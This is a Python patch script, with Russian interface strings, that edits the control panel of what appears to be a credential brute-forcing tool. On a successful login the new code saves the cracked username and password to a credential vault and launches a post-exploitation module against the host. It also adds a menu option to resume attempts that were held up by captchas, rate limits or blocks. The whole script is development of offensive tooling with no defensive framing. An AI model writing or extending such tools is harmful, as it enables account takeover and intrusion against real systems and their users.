# -*- coding: utf-8 -*-
import io, py_compile, sys

PAIRS = []

P = r"C:\work\hunt2\panel.py"
s = io.open(P, encoding="utf-8-sig").read()
old = """    if state == "ok" and creds:
        d = store.get(h)
        d["creds"] = creds
        store.save(h, d)
        ui.ok("вход: " + creds)"""
new = """    if state == "ok" and creds:
        from core import vault
        from modules import post
        d = store.get(h)
        d["creds"] = creds
        store.save(h, d)
        u, _, p = creds.partition(":")
        vault.add(h, _kind(h), u, p)
        ui.ok("вход: " + creds)
        post.run(h, _kind(h), creds)"""
if s.count(old) != 1:
    print("panel tool_brute не найден"); sys.exit(1)
s = s.replace(old, new)

old2 = """        ui.item("4", "снять STOP", "продолжить")
        ui.item("0", "назад")"""
new2 = """        ui.item("4", "снять STOP", "продолжить")
        ui.item("5", "возобновить отложенные", "капча, лимит, блок")
        ui.item("0", "назад")"""
if s.count(old2) != 1:
    print("panel STOP-меню не найдено"); sys.exit(1)
s = s.replace(old2, new2)

old3 = """        elif c == "4":
            try:
                os.remove(STOP)
            except Exception:
                pass
            ui.ok("STOP снят")
            ui.pause()"""
new3 = """        elif c == "4":
            try:
                os.remove(STOP)
            except Exception:
                pass
            ui.ok("STOP снят")
            ui.pause()
        elif c == "5":
            from modules import brute as br
            ui.head("ВОЗОБНОВЛЕНИЕ")
            try:
                st = br.resume()
                for k, v in st.items():
                    ui.say("%-8s %d" % (k, v))
                if not st:
                    ui.say("отложенных нет")
            except Exception as e:
                ui.err("сбой: %s" % e)
            ui.pause()"""
if s.count(old3) != 1:
    print("panel обработчик STOP не найден"); sys.exit(1)
s = s.replace(old3, new3)

io.open(P, "w", encoding="utf-8-sig", newline="\n").write(s)
py_compile.compile(P, doraise=True)
print("panel ок")
